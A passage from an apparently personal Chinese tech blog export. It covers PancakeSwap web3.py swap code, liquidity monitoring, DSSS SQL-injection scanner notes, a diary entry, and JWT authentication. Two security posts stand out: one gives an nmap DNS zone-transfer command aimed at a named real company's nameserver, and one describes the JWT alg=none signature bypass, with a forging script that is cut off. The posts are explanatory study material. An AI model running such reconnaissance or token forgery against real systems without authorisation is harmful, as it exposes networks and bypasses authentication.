<li><code>removeLiquidityETHWithPermit</code></li>
<li><code>removeLiquidityETHWithPermitSupportingFeeOnTransferTokens</code></li>
<li><code>removeLiquidityWithPermit</code></li>
</ul>
<p>swap相关:</p>
<ul>
<li><code>swapETHForExactTokens</code></li>
<li><code>swapExactETHForTokens</code></li>
<li><code>swapExactETHForTokensSupportingFeeOnTransferTokens</code></li>
<li><code>swapExactTokensForETH</code></li>
<li><code>swapExactTokensForETHSupportingFeeOnTransferTokens</code></li>
<li><code>swapExactTokensForTokens</code></li>
<li><code>swapExactTokensForTokensSupportingFeeOnTransferTokens</code></li>
<li><code>swapTokensForExactETH</code></li>
<li><code>swapTokensForExactTokens</code></li>
</ul>
<hr>
<h2 id="Swap-BNB-gt-anyToken"><a href="#Swap-BNB-gt-anyToken" class="headerlink" title="Swap: BNB -&gt; anyToken"></a>Swap: BNB -&gt; anyToken</h2><h3 id="swapExactETHForTokens"><a href="#swapExactETHForTokens" class="headerlink" title="swapExactETHForTokens:"></a>swapExactETHForTokens:</h3><p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/2C5A9C3B-04CF-42FA-9542-72640DFFBC3E.png" alt="2C5A9C3B-04CF-42FA-9542-72640DFFBC3E"></p>
<p>swapExactETHForTokens():</p>
<ul>
<li><code>amountOutMin</code>:收到最小量</li>
<li><code>path</code>:代币地址列表,eg:<code>[BNB代币地址,anyToken代币地址]</code></li>
<li><code>to</code>:收币地址</li>
<li><code>deadline</code>:交易过期时间</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pancakeswap2_txn = contract.functions.swapExactETHForTokens(</span><br><span class="line">    <span class="comment"># 10000000000,  # set to 0, or specify minimum amount of tokeny you want to receive - consider decimals!!!</span></span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    [spend, tokenToBuy],</span><br><span class="line">    sender_address,</span><br><span class="line">    (<span class="built_in">int</span>(time.time()) + <span class="number">10000</span>)</span><br><span class="line">).buildTransaction(&#123;</span><br><span class="line">    <span class="string">&#x27;from&#x27;</span>: sender_address,</span><br><span class="line">    <span class="string">&#x27;value&#x27;</span>: web3.toWei(<span class="number">0.0001</span>, <span class="string">&#x27;ether&#x27;</span>),  <span class="comment"># This is the Token(BNB) amount you want to Swap from</span></span><br><span class="line">    <span class="string">&#x27;gas&#x27;</span>: <span class="number">160000</span>,</span><br><span class="line">    <span class="string">&#x27;gasPrice&#x27;</span>: web3.toWei(<span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;gwei&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;nonce&#x27;</span>: nonce,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>例子:<a href="https://bscscan.com/tx/0x2cc0a920f509a893850a9cb625be4dfee35efc89734df6440d27053b16e03a63">记录tx</a></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211014204336.png" alt="20211014204336"></p>
<hr>
<h2 id="Swap-AToken-gt-BToken"><a href="#Swap-AToken-gt-BToken" class="headerlink" title="Swap: AToken -&gt; BToken"></a>Swap: AToken -&gt; BToken</h2><h3 id="approve授权"><a href="#approve授权" class="headerlink" title="approve授权:"></a>approve授权:</h3><p>先要将你的代币授权给<code>pancakeswap router contract</code></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/A7140CDA-DE03-4BE6-86B4-1490396BE088.png" alt="A7140CDA-DE03-4BE6-86B4-1490396BE088"></p>
<p>approve():</p>
<ul>
<li>spender:给予授权的地址,这里是要授权给<code>pancakeswap router contract</code></li>
<li>rawAmount:代币数量</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">aprove_txn = erc20_contract.functions.approve(</span><br><span class="line">    <span class="comment"># 10000000000,  # set to 0, or specify minimum amount of tokeny you want to receive - consider decimals!!!</span></span><br><span class="line">    panRouterContractAddress, max_approval_int</span><br><span class="line">).buildTransaction(&#123;</span><br><span class="line">    <span class="string">&#x27;from&#x27;</span>: sender_address,</span><br><span class="line">    <span class="string">&#x27;value&#x27;</span>: <span class="number">0</span>,  <span class="comment"># This is the Token(BNB) amount you want to Swap from</span></span><br><span class="line">    <span class="string">&#x27;gas&#x27;</span>: <span class="number">160000</span>,</span><br><span class="line">    <span class="string">&#x27;gasPrice&#x27;</span>: web3.toWei(<span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;gwei&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;nonce&#x27;</span>: nonce,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>例子:<a href="https://bscscan.com/tx/0x2cc0a920f509a893850a9cb625be4dfee35efc89734df6440d27053b16e03a63">记录tx</a><br><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211014202846.png" alt="20211014202846"></p>
<h3 id="swapExactTokensForTokens"><a href="#swapExactTokensForTokens" class="headerlink" title="swapExactTokensForTokens:"></a>swapExactTokensForTokens:</h3><p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/C28E659E-C391-4DC5-9A22-C5E78E5C92E7.png" alt="C28E659E-C391-4DC5-9A22-C5E78E5C92E7"></p>
<p>swapExactTokensForTokens():</p>
<ul>
<li>amountIn:交换数量</li>
<li>amountOutMin:收到最小量,考虑滑点</li>
<li><code>path</code>:代币地址列表,一般要有中间代币,eg:<code>[AToken代币地址,中间代币地址,BToken代币地址]</code></li>
<li><code>to</code>:收币地址</li>
<li><code>deadline</code>:交易过期时间</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pancakeswap2_txn = contract.functions.swapExactTokensForTokens(</span><br><span class="line">    <span class="comment"># 10000000000,  # set to 0, or specify minimum amount of tokeny you want to receive - consider decimals!!!</span></span><br><span class="line">    web3.toWei(<span class="number">50</span>, <span class="string">&#x27;ether&#x27;</span>), web3.toWei(<span class="number">0.04</span>, <span class="string">&#x27;ether&#x27;</span>), [tokenToBuy, cake_token, USDT_token], sender_address, (<span class="built_in">int</span>(time.time()) + <span class="number">10000</span>)</span><br><span class="line">).buildTransaction(&#123;</span><br><span class="line">    <span class="string">&#x27;from&#x27;</span>: sender_address,</span><br><span class="line">    <span class="string">&#x27;value&#x27;</span>: <span class="number">0</span>,  <span class="comment"># This is the Token(BNB) amount you want to Swap from</span></span><br><span class="line">    <span class="string">&#x27;gas&#x27;</span>: <span class="number">220000</span>,</span><br><span class="line">    <span class="string">&#x27;gasPrice&#x27;</span>: web3.toWei(<span class="string">&#x27;5.1&#x27;</span>, <span class="string">&#x27;gwei&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;nonce&#x27;</span>: nonce,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>例子:<a href="https://bscscan.com/tx/0xf512c118a6e5082aacf72b789125bda47a639eea52b36b635678c25e6e316cc1">记录tx</a><br><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211014204147.png" alt="20211014204147"></p>
<hr>
<h1 id="Bug"><a href="#Bug" class="headerlink" title="Bug:"></a>Bug:</h1><p>暂时只遇到以下报错:</p>
<h2 id="TRANSFER-FAILED"><a href="#TRANSFER-FAILED" class="headerlink" title="TRANSFER_FAILED:"></a>TRANSFER_FAILED:</h2><p><code>Fail with error &#39;Pancake: TRANSFER_FAILED&#39;</code>:</p>
<ul>
<li>注意授权</li>
<li>注意gas fee够不够</li>
</ul>
<h2 id="INSUFFICIENT-OUTPUT-AMOUNT-or-INSUFFICIENT-INPUT-AMOUNT"><a href="#INSUFFICIENT-OUTPUT-AMOUNT-or-INSUFFICIENT-INPUT-AMOUNT" class="headerlink" title="INSUFFICIENT_OUTPUT_AMOUNT or INSUFFICIENT_INPUT_AMOUNT"></a>INSUFFICIENT_OUTPUT_AMOUNT or INSUFFICIENT_INPUT_AMOUNT</h2><p><code>Fail with error &#39;PancakeRouter: INSUFFICIENT_OUTPUT_AMOUNT</code><br><code>Fail with error &#39;PancakeLibrary: INSUFFICIENT_INPUT_AMOUNT</code></p>
<p>注意数量单位是<code>wei</code>,可以用<code>web3.toWei(&#39;5.1&#39;, &#39;gwei&#39;),</code>转换成gwei</p>
<hr>
<h1 id="Question"><a href="#Question" class="headerlink" title="Question:"></a>Question:</h1><p>还有几个问题还有些疑惑:</p>
<ol>
<li>调用<code>swapExactTokensForTokens</code>，如何自动获取中间的转换代币?是用<code>BNB</code>还是<code>CAKE</code>?</li>
<li>通过滑点计算出<code>amountOutMin</code></li>
<li>gas fee要给多少?才不会过高过低?</li>
</ol>
<hr>
<h1 id="Todo"><a href="#Todo" class="headerlink" title="Todo:"></a>Todo:</h1><ol>
<li><p>部署合约，做个和Zap类似的小dapp</p>
</li>
<li><p>defi自动收菜</p>
<ul>
<li>定时收菜，每过一段时间(如每月15号)，自动collect,然后卖出换U, 甚至进一步可以 将u质押到<code>venus</code>里</li>
<li>冲新矿的二矿,有高apr，短时间挖提买，监控代币，如果代币价格接近成本价，则全部清仓</li>
</ul>
</li>
</ol>
<blockquote>
<p>还是要多实践多do呀，maybe会有一些new idea~</p>
</blockquote>
<hr>
<h1 id="Refs"><a href="#Refs" class="headerlink" title="Refs:"></a>Refs:</h1><ul>
<li><a href="https://github.com/PancakeBunny-finance/Bunny/blob/main/contracts/zap/ZapBSC.sol">pancakeBunny源码</a></li>
<li><a href="https://bscscan.com/address/0x10ed43c718714eb63d5aa57b78b54704e256024e#writeContract">pancakeswap router contract</a></li>
<li><a href="https://www.followchain.org/transfer-from-failed-pancakeswap/#1">How to Fix “TRANSFER_FROM_FAILED” on PancakeSwap</a></li>
</ul>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>DNS域传送漏洞</title>
    <url>//40526.html</url>
    <content><![CDATA[<h1 id="DNS域传送漏洞"><a href="#DNS域传送漏洞" class="headerlink" title="DNS域传送漏洞:"></a>DNS域传送漏洞:</h1><h2 id="DNS记录分类"><a href="#DNS记录分类" class="headerlink" title="DNS记录分类"></a>DNS记录分类</h2><p>常见的DNS记录有以下几类：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A记录       IP地址记录,记录一个域名对应的IP地址</span><br><span class="line">AAAA记录    IPv6地址记录，记录一个域名对应的IPv6地址</span><br><span class="line">CNAME记录   别名记录，记录一个主机的别名</span><br><span class="line">MX记录      电子邮件交换记录，记录一个邮件域名对应的IP地址</span><br><span class="line">NS记录      域名服务器记录 ,记录该域名由哪台域名服务器解析</span><br><span class="line">PTR记录     反向记录，也即从IP地址到域名的一条记录</span><br><span class="line">TXT记录     记录域名的相关文本信息</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理:"></a>原理:</h2><p>DNS服务器分为：主服务器、备份服务器和缓存服务器。</p>
<p>在主备服务器之间同步数据库，需要使用“DNS域传送”。</p>
<p><strong>域传送是指备份服务器从主服务器拷贝数据，并用得到的数据更新自身数据库。</strong></p>
<p>若DNS服务器<strong>配置不当（本来只有备份服务器能获得主服务器的数据，由于漏洞导致任意client都能通过“域传送”获得主服务器的数据（zone数据库信息））</strong>，可能导致攻击者获取某个域的所有记录。</p>
<p>造成整个网络的拓扑结构泄露给潜在的攻击者，包括一些安全性较低的内部主机，如测试服务器。</p>
<p>同时，黑客可以快速的判定出某个特定zone的所有主机，收集域信息，选择攻击目标，找出未使用的IP地址，绕过基于网络的访问控制。</p>
<p>攻击者能获取的敏感主要包括：</p>
<p>1）网络的拓扑结构，服务器集中的IP地址段</p>
<p>2）数据库服务器的IP地址</p>
<p>3）测试服务器的IP地址，</p>
<p>4）VPN服务器地址泄露</p>
<p>5）其他敏感服务器</p>
<hr>
<h2 id="检测"><a href="#检测" class="headerlink" title="检测:"></a>检测:</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap --script dns-zone-transfer --script-args dns-zone-transfer.domain=li-ning.com -p 53 -Pn ns.lining.cn</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20201113100039.png" alt="20201113100039"></p>
<hr>
<h1 id="refs"><a href="#refs" class="headerlink" title="refs:"></a>refs:</h1><ul>
<li><a href="https://www.jianshu.com/p/d2af08e6f8fb">dns 域传送漏洞利用总结</a></li>
</ul>
]]></content>
      <categories>
        <category>WebSecurity</category>
      </categories>
      <tags>
        <tag>WebSecurity</tag>
      </tags>
  </entry>
  <entry>
    <title>Dsss源码-100行的SqliScanner-源码分析笔记</title>
    <url>//56271.html</url>
    <content><![CDATA[<h1 id="Pre"><a href="#Pre" class="headerlink" title="Pre:"></a>Pre:</h1><p>最近想要写个Auto Sqli Scanner,故找了sqlmap作者写的工具DSSS来参考.</p>
<blockquote>
<p>Damn Small SQLi Scanner (DSSS) is a fully functional SQL injection vulnerability scanner (supporting GET and POST parameters) written in under 100 lines of code.</p>
</blockquote>
<p>之前也看过一部分<code>sqlmap</code>的源码，看起来头真的有点大。</p>
<p>相比强大的<code>sqlmap</code>来说,这个工具短小精悍,便于食用,毕竟代码量少很多hhh.</p>
<p>原仓库地址:<a href="https://github.com/stamparm/DSSS">Damn Small SQLi Scanner</a><br>我的源代码注释版本:<code>https://github.com/jerrychan807/DSSS</code></p>
<hr>
<h1 id="整体流程"><a href="#整体流程" class="headerlink" title="整体流程:"></a>整体流程:</h1><p><img src="https://i.loli.net/2019/05/06/5cd054aa1e705.png"></p>
<hr>
<h2 id="提取内容函数："><a href="#提取内容函数：" class="headerlink" title="提取内容函数："></a>提取内容函数：</h2><p><img src="https://i.loli.net/2019/05/06/5cd0550f672ff.png"></p>
<p>亮点:</p>
<ul>
<li>TEXT文本的处理</li>
</ul>
<hr>
<h2 id="基于报错的测试"><a href="#基于报错的测试" class="headerlink" title="基于报错的测试:"></a>基于报错的测试:</h2><p><img src="https://i.loli.net/2019/05/06/5cd0557531ada.png"></p>
<hr>
<h2 id="基于布尔的测试"><a href="#基于布尔的测试" class="headerlink" title="基于布尔的测试:"></a>基于布尔的测试:</h2><p><img src="https://i.loli.net/2019/05/06/5cd05595e835e.png"></p>
<p>在页面文本相似度那里,对于0.95那个理解有点费劲,提了个<a href="https://github.com/stamparm/DSSS/issues/8">issue</a>问作者.</p>
<p>作者很nice,也很快就回复我了。我才get到它这里面的判断有2种:精确判断和模糊判断.</p>
<p>精确判断：可以通过<code>HTTP-CODE</code>和<code>TITLE</code>来判断两个页面是否是100%一样</p>
<p>模糊判断: 通过<code>quick_ratio</code>来计算两个页面的文本相似度,因为<code>quick_ratio</code>计算有时不太准确,有一定的误差,故<code>FUZZY_THRESHOLD = 0.95</code>设置如此,留了5%做误差.</p>
]]></content>
      <categories>
        <category>SourceCodeReading</category>
      </categories>
      <tags>
        <tag>SourceCodeReading</tag>
      </tags>
  </entry>
  <entry>
    <title>Diary-2019.9</title>
    <url>//44403.html</url>
    <content><![CDATA[<h1 id="2019-09-26"><a href="#2019-09-26" class="headerlink" title="2019-09-26"></a>2019-09-26</h1><blockquote>
<ul>
<li>我们是用动力或意志力开启新的（非习惯性）行为的。</li>
<li>动力不可靠，所以不能充当建立习惯的策略。</li>
<li>意志力可靠，但前提是你没有把它耗尽。</li>
<li>引起意志力损耗的5大主要因素：努力程度、感知难度、消极情绪、主观疲劳和血糖水平。</li>
<li>如果我们能成功克服这5项障碍，我们就应该能走向成功。</li>
</ul>
</blockquote>
<blockquote>
<p>主观疲劳与很多因素有关，其中一个主要因素就是你如何看待自己与目标之间的斗争。</p>
<p><strong>我发现如果我的目标很高，主观疲劳就会更严重，这很合乎逻辑，因为思维会“预判”接下来的工作，而且会早早感受到压迫。</strong></p>
<p>近期的一项研究发现，人类的想象力非常强，甚至会改变我们在现实世界中看到和听到的内容。所以对工作量很重的认知也会影响精力水平，这种说法一点儿也不夸张。这次元分析的研究人员也支持该观点，他们记录道：“对接下来的自我控制行为的意识加剧了（自我损耗）效应。</p>
<p><strong>”我发现，当我设定的目标只是1个俯卧撑时，我感受到的主观疲劳明显减退了。事实上，我感觉自己有充足的能量完成1个俯卧撑，而且这种“轻易就能做成一件事”的想法，哪怕是很小的事，也能让我的能量更充足。</strong></p>
</blockquote>
<p>自己就是经常把目标设得很高,搞得自己有很重的无力感和焦虑感,每天都浑浑噩噩的.每天也没有持续进步,就这样陷入了一个很深的负能量的死循环.</p>
<p>然后每天都很晚睡,第二天的大脑也是晕乎乎的.</p>
<p>尝试用一下微习惯,每天轻松的把自己往前Push一点点</p>
<blockquote>
<p>把自己想象成轨道上的小球，或者是牛顿定律里说的“静止的物体”。</p>
<p><strong>动力策略派坚持的观点是你必须在行动之前激发动力，可先向前移动1厘米然后借助动量不是更轻松吗？没错，这样轻松得多！稍微向前移动后，你就可以继续运动了。</strong></p>
<p>一旦动起来，原来的等式就会变为对你更有利的物理定律：“除非受到外力作用，否则处于运动状态中的物体速度不会改变。”</p>
<p>我们都希望自己能朝着目标运动，走得越远、越频繁越好。要做到这一点，<strong>第一个动作就必须非常简单，因为在任何一项任务里，它都是阻止你前进的第一堵墙。开头是相比之下最难的环节，但这并不是说开头真的很难。“最难”是相对而言的。</strong></p>
</blockquote>
<p>This is so cool.man~~~</p>
<hr>
<h1 id="2019-09-27"><a href="#2019-09-27" class="headerlink" title="2019-09-27"></a>2019-09-27</h1>]]></content>
      <categories>
        <category>Diary</category>
      </categories>
      <tags>
        <tag>Diary</tag>
      </tags>
  </entry>
  <entry>
    <title>FAQ-如何监控token初次添加流动性</title>
    <url>//14901.html</url>
    <content><![CDATA[<h1 id="Pre"><a href="#Pre" class="headerlink" title="Pre:"></a>Pre:</h1><p>很多币在一开始空投的时候，还没添加流动性，由于没有流动性，无法在<code>dex</code>上进行买卖。<br>那如何监控某个币初次添加了流动性呢？</p>
<p>暂时能想到的2个思路:</p>
<ul>
<li>监控bscscan上的数据</li>
<li>查询LP地址在配对主流币种的余额</li>
</ul>
<h1 id="监控bscscan"><a href="#监控bscscan" class="headerlink" title="监控bscscan:"></a>监控bscscan:</h1><p>这部分我没有去具体实现，暂时能想到的有几个实现的方向<br>已知项目方的地址后，去监控对应地址有没<code>Add Liquidity</code>的动作</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220513150515.png" alt="20220513150515"></p>
<p>或者监控<code>PancakeSwap: Router v2</code>合约的交互记录里的<code>Add Liquidity</code>的动作</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220513150709.png" alt="20220513150709"></p>
<h1 id="LP地址在配对主流币种合约里的余额"><a href="#LP地址在配对主流币种合约里的余额" class="headerlink" title="LP地址在配对主流币种合约里的余额"></a>LP地址在配对主流币种合约里的余额</h1><p>如果是在bsc上的话，一般添加流动性的时候，Token会与<code>BNB</code>、<code>USDT</code>、<code>BUSD</code>、<code>CAKE</code>、<code>USDC</code>等主流的币种进行组合。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220513151119.png" alt="20220513151119"></p>
<p>例如该<code>token</code>是和<code>USDT</code>组合的，那用<code>LP Token</code>地址在<code>USDT</code>的合约能查询到对应的余额。</p>
<p>例如某token只和<code>USDT</code>组合添加了流动性，那在看k线网站上<code>liquidity</code>数值和<code>LP Token</code>地址在<code>USDT</code>的合约里的余额是一样的。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220513152149.png" alt="20220513152149"></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220513152421.png" alt="20220513152421"></p>
<p>那么我们就能通过<code>LP Token</code>地址在主流币种合约里的余额来判断、监控 首次添加的流动性的动作。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 部分代码</span></span><br><span class="line">USDT_contract = bsc_ins.get_token_contract_with_abi(contract_address=USDT_token, abi=erc20abi) <span class="comment"># usdt合约实例</span></span><br><span class="line">YourToken_usdt_lp = Web3.toChecksumAddress(<span class="string">&quot;0x5eaa1c251db4b0aea24619a37c5c311111111111&quot;</span>) <span class="comment"># token&amp;USDT 组成的lp地址</span></span><br><span class="line">balanceOf = USDT_contract.functions.balanceOf(Web3.toChecksumAddress(YourToken_usdt_lp)).call() <span class="comment"># 查询Lp地址的USDT的余额</span></span><br><span class="line"><span class="keyword">if</span> balanceOf &gt; <span class="number">0</span>:</span><br><span class="line">    notify_content = <span class="string">&quot;&quot;&quot;🟢Usdt lp池子监控存在 \n&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>Question: </p>
<ol>
<li>如果某token的流动性池子里存在多个配对的主流币种，看k线网站上<code>liquidity</code>数值是怎么统计出来的呢？</li>
<li>如何快速查询某token的lp地址?多个地址？</li>
</ol>
</blockquote>
<h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary:"></a>Summary:</h1><p>监控token初次添加流动性的方法:</p>
<ul>
<li>监控bscscan上的数据<ul>
<li>项目方的地址的<code>Add Liquidity</code>动作</li>
<li><code>PancakeSwap: Router v2</code>合约里的<code>Add Liquidity</code>的动作</li>
</ul>
</li>
<li>查询LP地址在配对主流币种(<code>BNB</code>、<code>USDT</code>、<code>BUSD</code>等)合约里的余额</li>
</ul>
<h1 id="Refs"><a href="#Refs" class="headerlink" title="Refs:"></a>Refs:</h1><ul>
<li><a href="https://github.com/beeb/pancaketrade">PancakeTrade</a></li>
</ul>
]]></content>
      <categories>
        <category>FAQ</category>
      </categories>
      <tags>
        <tag>FAQ</tag>
      </tags>
  </entry>
  <entry>
    <title>JSON Web Token(JWT)攻击探究(一)</title>
    <url>//59254.html</url>
    <content><![CDATA[<h1 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h1><p>用户认证的方式通常有两种，传统的session认证 和 基于token方式。</p>
<hr>
<h2 id="传统的session认证"><a href="#传统的session认证" class="headerlink" title="传统的session认证"></a>传统的session认证</h2><h3 id="sessionID的生成方式"><a href="#sessionID的生成方式" class="headerlink" title="sessionID的生成方式:"></a>sessionID的生成方式:</h3><p>浏览器第一次访问服务器时，服务器创建一个<code>session</code>，同时生成一个唯一的会话key，即<code>sessionID</code>。</p>
<p>接着sessionID及session分别作为key和value保存到缓存中，也可以保存到数据库中，然后服务器把sessionID以cookie的形式发送给浏览器，浏览器下次访问服务器时直接携带上cookie中的sessionID，服务器再根据sessionID找到对应的session进行匹配</p>
<p>这里我们注意到两点：</p>
<ol>
<li><code>sessionID</code>会自动由浏览器带上 </li>
<li><code>session</code>是需要存储空间的</li>
</ol>
<h3 id="缺陷"><a href="#缺陷" class="headerlink" title="缺陷"></a>缺陷</h3><p>传统的session认证,随着不同客户端用户的增加，独立的服务器已无法承载更多的用户，而这时候基于session认证应用的问题就会暴露出来.</p>
<p>例如而随着认证用户的增多，服务端的开销会明显增大，这样在分布式的应用上，相应的限制了负载均衡器的能力，因为是基于cookie来进行用户识别的, cookie如果被截获，用户就会很容易受到跨站请求伪造的攻击。</p>
<hr>
<h2 id="基于token的鉴权机制"><a href="#基于token的鉴权机制" class="headerlink" title="基于token的鉴权机制"></a>基于token的鉴权机制</h2><p>基于token的鉴权机制类似于http协议也是无状态的，它不需要在服务端去保留用户的认证信息或者会话信息。这就意味着<strong>基于token认证机制的应用不需要去考虑用户在哪一台服务器登录</strong>了，这就为应用的扩展提供了便利。</p>
<h3 id="token的生成方式"><a href="#token的生成方式" class="headerlink" title="token的生成方式"></a>token的生成方式</h3><p>浏览器第一次访问服务器时，服务器根据传过来的唯一标识<code>userId</code>，通过一些算法，加一个密钥，生成一个token，接着通过base64编码将token返回给客户端。客户端将token保存起来，下次请求时需要带着token，服务器收到请求后，用相同的算法和密钥去验证token</p>
<p>这里我们注意到两点：</p>
<ol>
<li>token需要代码才能带上</li>
<li>token可以不需要存储空间（JWT）（当然也有存入缓存的处理，特别是要进行revoke操作时），通过算法和密钥验证</li>
</ol>
<h2 id="token与sessionID的区别"><a href="#token与sessionID的区别" class="headerlink" title="token与sessionID的区别:"></a>token与sessionID的区别:</h2><ol>
<li>浏览器方面，是否直接带上 </li>
<li>服务器方面，是否需要存储空间。</li>
</ol>
<blockquote>
<p>其实token与session的问题是一种时间与空间的博弈问题，session是空间换时间，而token是时间换空间。两者的选择要看具体情况而定。</p>
</blockquote>
<hr>
<h1 id="JWT-JSON-Web-Token"><a href="#JWT-JSON-Web-Token" class="headerlink" title="JWT(JSON Web Token)"></a>JWT(JSON Web Token)</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义:"></a>定义:</h2><p>JWT(JSON Web Token) 是一个非常轻巧的规范，通过这个规范，可以传递可靠的安全信息，JWT常被用于前后端分离，可以和Restful API配合使用，常用于构建身份认证机制。</p>
<p>Json web token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（(RFC 7519).</p>
<p>该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。</p>
<p>JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。</p>
<hr>
<h2 id="组成"><a href="#组成" class="headerlink" title="组成:"></a>组成:</h2><p>一个通常你看到的jwt，由以下三部分组成，它们分别是：</p>
<ol>
<li><p><code>header</code>：主要声明了JWT的签名算法；</p>
</li>
<li><p><code>payload</code>：主要承载了各种声明并传递明文数据；</p>
</li>
<li><p><code>signture</code>：拥有该部分的JWT被称为JWS，也就是签了名的JWS；没有该部分的JWT被称为nonsecure JWT 也就是不安全的JWT，此时header中声明的签名算法为none。</p>
</li>
</ol>
<p><code>signture</code>:将上面的<code>header</code>和<code>payload</code>编码后的字符串都用句号.连接在一起 提供一个密钥（secret）用头部所规定的算法加密就可以形成一个新的字符串</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200417110456.png" alt="20200417110456"></p>
<p>三个部分用·分割。形如<code>xxxxx.yyyyy.zzzzz</code>的样式。</p>
<p>示例:</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200417105901.png" alt="20200417105901"></p>
<h2 id="签名的目的"><a href="#签名的目的" class="headerlink" title="签名的目的:"></a>签名的目的:</h2><p>最后一步签名的过程，实际上是对头部以及载荷内容进行签名。</p>
<p>所以，如果有人对头部以及载荷的内容解码之后进行修改，再进行编码的话，那么新的头部和载荷的签名和之前的签名就将是不一样的。而且，如果不知道服务器加密的时候用的密钥的话，得出来的签名也一定会是不一样的。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200417110731.png" alt="20200417110731"></p>
<p>服务器应用在接受到JWT后，会首先对头部和载荷的内容用同一算法再次签名。那么服务器应用是怎么知道我们用的是哪一种算法呢？别忘了，我们在JWT的头部中已经用alg字段指明了我们的加密算法了。</p>
<p>如果服务器应用对头部和载荷再次以同样方法签名之后发现，自己计算出来的签名和接受到的签名不一样，那么就说明这个Token的内容被别人动过的，我们应该拒绝这个Token，返回一个HTTP 401 Unauthorized响应。</p>
<hr>
<h1 id="工具"><a href="#工具" class="headerlink" title="工具:"></a>工具:</h1><p><a href="https://jwt.io/">解jwt的</a></p>
<hr>
<h1 id="refs"><a href="#refs" class="headerlink" title="refs:"></a>refs:</h1><ul>
<li><p><a href="https://segmentfault.com/a/1190000015881055">token与sessionId的区别——学习笔记</a></p>
</li>
<li><p><a href="http://blog.leapoahead.com/2015/09/07/user-authentication-with-jwt/">八幅漫画理解使用JSON Web Token设计单点登录系统</a></p>
</li>
<li><p><a href="http://blog.leapoahead.com/2015/09/06/understanding-jwt/">JSON Web Token - 在Web应用间安全地传递信息</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>WebSecurity</category>
      </categories>
      <tags>
        <tag>WebSecurity</tag>
      </tags>
  </entry>
  <entry>
    <title>JSON Web Token(JWT)攻击探究(二)</title>
    <url>//10194.html</url>
    <content><![CDATA[<h1 id="JWT-攻击面"><a href="#JWT-攻击面" class="headerlink" title="JWT 攻击面:"></a>JWT 攻击面:</h1><h2 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露:"></a>敏感信息泄露:</h2><p>当服务端的秘钥泄密的时候，JWT的伪造就变得非常简单容易。对此，服务端应该妥善保管好私钥，以免被他人窃取。</p>
<p>header和payload部分实际上只是进行了base64编码</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200417143359.png" alt="20200417143359"></p>
<hr>
<h2 id="alg-x3D-None签名绕过"><a href="#alg-x3D-None签名绕过" class="headerlink" title="alg&#x3D;None签名绕过:"></a>alg&#x3D;None签名绕过:</h2><p>签名算法确保恶意用户在传输过程中不会修改JWT。</p>
<p>但是标题中的alg字段可以更改为none。</p>
<p>一些JWT库支持无算法，即没有签名算法。当alg为none时，后端将不执行签名验证。将alg更改为none后，从JWT中删除签名数据（仅标题+’.’+ payload +’.’）并将其提交给服务器</p>
<p>例子:</p>
<p><code>http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b64urlencode</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(data).replace(<span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;-&#x27;</span>).replace(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;_&#x27;</span>).replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">result = b64urlencode(<span 